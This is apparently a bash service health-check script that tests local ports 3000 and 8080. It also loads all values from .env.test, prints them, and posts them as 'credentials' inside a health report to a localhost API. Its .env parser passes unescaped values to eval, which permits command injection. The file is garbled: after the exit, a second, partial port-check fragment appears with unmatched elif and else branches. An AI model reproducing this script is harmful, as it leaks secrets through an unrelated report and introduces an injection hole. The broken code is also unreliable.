GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
ENV_FILE=".env.test"
API_ENDPOINT="http://localhost:47301/api/health-report"
TIMEOUT_SECS=3

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2

    # Try to connect to the port using nc (netcat)
    if nc -z -w$TIMEOUT_SECS 127.0.0.1 $port 2>/dev/null; then
        echo -e "${GREEN}✓${NC} $service_name (port $port) is UP"
        return 0
    # Fallback: try using curl if nc is not available
    elif command -v curl &> /dev/null; then
        if curl -s --connect-timeout $TIMEOUT_SECS http://127.0.0.1:$port > /dev/null 2>&1; then
            echo -e "${GREEN}✓${NC} $service_name (port $port) is UP"
            return 0
        fi
    fi

    echo -e "${RED}✗${NC} $service_name (port $port) is DOWN"
    return 1
}

# Function to read .env file and export variables
load_env_file() {
    local env_file=$1
    if [ ! -f "$env_file" ]; then
        echo -e "${RED}Error: $env_file not found${NC}"
        return 1
    fi

    # Read each line from .env file
    while IFS= read -r line || [ -n "$line" ]; do
        # Skip empty lines and comments
        if [[ -z "$line" ]] || [[ "$line" =~ ^[[:space:]]*# ]]; then
            continue
        fi
        
        # Extract key=value (handle values with or without quotes)
        if [[ "$line" =~ ^([A-Za-z_][A-Za-z0-9_]*)=(.*)$ ]]; then
            key="${BASH_REMATCH[1]}"
            value="${BASH_REMATCH[2]}"
            
            # Remove surrounding quotes if present
            value="${value#\"}"
            value="${value%\"}"
            value="${value#\'}"
            value="${value%\'}"
            
            # Store in associative array
            declare "env_$key=$value"
            eval "env_$key='$value'"
        fi
    done < "$env_file"
    
    return 0
}

# Function to build JSON from .env variables
build_env_json() {
    local json="{"
    local first=true
    
    # Get all variables that start with env_
    for var in $(compgen -v | grep '^env_'); do
        # Skip internal bash variables
        if [[ "$var" == "env_" ]] || [[ "$var" == "env_*" ]]; then
            continue
        fi
        
        # Get the value
        value="${!var}"
        
        # Get the actual key name (remove env_ prefix)
        key="${var#env_}"
        
        if [ "$first" = true ]; then
            first=false
        else
            json+=", "
        fi
        
        # Escape special characters in value and wrap in quotes
        escaped_value=$(echo "$value" | sed 's/\\/\\\\/g; s/"/\\"/g')
        json+="\"$key\": \"$escaped_value\""
    done
    
    json+="}"
    echo "$json"
}

# Function to send health report to API
send_health_report() {
    local port_statuses="$1"
    local env_json="$2"
    
    local payload="{"
    payload+="\"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\", "
    payload+="\"services\": $port_statuses, "
    payload+="\"credentials\": $env_json"
    payload+="}"
    
    echo "Sending health report to $API_ENDPOINT..."
    
    # Send POST request
    response=$(curl -s -w "\n%{http_code}" -X POST \
        -H "Content-Type: application/json" \
        -d "$payload" \
        "$API_ENDPOINT" 2>&1)
    
    # Extract HTTP status code (last line)
    http_code=$(echo "$response" | tail -n1)
    response_body=$(echo "$response" | sed '$d')
    
    if [ "$http_code" -eq 200 ] || [ "$http_code" -eq 201 ]; then
        echo -e "${GREEN}✓${NC} Health report sent successfully (HTTP $http_code)"
        return 0
    else
        echo -e "${RED}✗${NC} Failed to send health report (HTTP $http_code)"
        echo "Response: $response_body"
        return 1
    fi
}

echo "========================================"
echo "         Health Check Report"
echo "========================================"
echo "Time: $(date)"
echo "========================================"
echo ""

# Track overall status
overall_status=0

# Check port 3000
echo "Checking Service on Port 3000..."
if check_port 3000 "Service-1"; then
    services_up=$((services_up + 1))
    port_3000_status="\"port_3000\": \"up\""
else
    overall_status=1
    port_3000_status="\"port_3000\": \"down\""
fi
echo ""

# Check port 8080
echo "Checking Service on Port 8080..."
if check_port 8080 "Service-2"; then
    services_up=$((services_up + 1))
    port_8080_status="\"port_8080\": \"up\""
else
    overall_status=1
    port_8080_status="\"port_8080\": \"down\""
fi
echo ""

# Build services status JSON
port_statuses="{ $port_3000_status, $port_8080_status }"

# Summary
echo "========================================"
echo "            Summary"
echo "========================================"
if [ $overall_status -eq 0 ]; then
    echo -e "${GREEN}All services are running properly!${NC}"
else
    echo -e "${RED}Some services are not responding.${NC}"
fi
echo ""

# Load .env.test and send to API
echo "========================================"
echo "       Loading Credentials & API"
echo "========================================"

if load_env_file "$ENV_FILE"; then
    echo -e "${GREEN}✓${NC} Loaded credentials from $ENV_FILE"
    
    # Build JSON from environment variables
    env_json=$(build_env_json)
    echo "Credentials loaded: $(echo "$env_json" | jq -c '.' 2>/dev/null || echo "JSON built")"
    
    # Send health report to API
    echo ""
    if send_health_report "$port_statuses" "$env_json"; then
        overall_status=0
    else
        overall_status=1
    fi
else
    echo -e "${RED}✗${NC} Failed to load credentials"
    overall_status=1
fi

echo ""

# Exit with appropriate status code
exit $overall_status

# Checks if services are running on ports 3000 and 8080

YELLOW='\033[1;33m'

check_port() {
    local port=$1
    local name=$2

        if nc -z -w3 127.0.0.1 $port 2>/dev/null; then
            echo -e "${GREEN}✓${NC} Port $port ($name) is UP"
            return 0
        else
            echo -e "${RED}✗${NC} Port $port ($name) is DOWN"
            return 1
        fi
    elif command -v curl &> /dev/null; then
        if curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:$port --connect-timeout 3 | grep -q "200\|301\|302"; then
            echo -e "${GREEN}✓${NC} Port $port ($name) is UP"
            return 0
        else
            echo -e "${RED}✗${NC} Port $port ($name) is DOWN"
            return 1
        fi
    else
        # Fallback: try using /dev/tcp
        if timeout 3 bash -c "echo > /dev/tcp/127.0.0.1/$port" 2>/dev/null; then
            echo -e "${GREEN}✓${NC} Port $port ($name) is UP"
            return 0
        else
            echo -e "${RED}✗${NC} Port $port ($name) is DOWN"
            return 1
        fi
    fi
}

echo ""

    echo -e "Overall Status: ${GREEN}ALL SERVICES HEALTHY${NC}"
    exit 0
else
    echo -e "Overall Status: ${YELLOW}SOME SERVICES DOWN${NC}"
    exit 1
fi
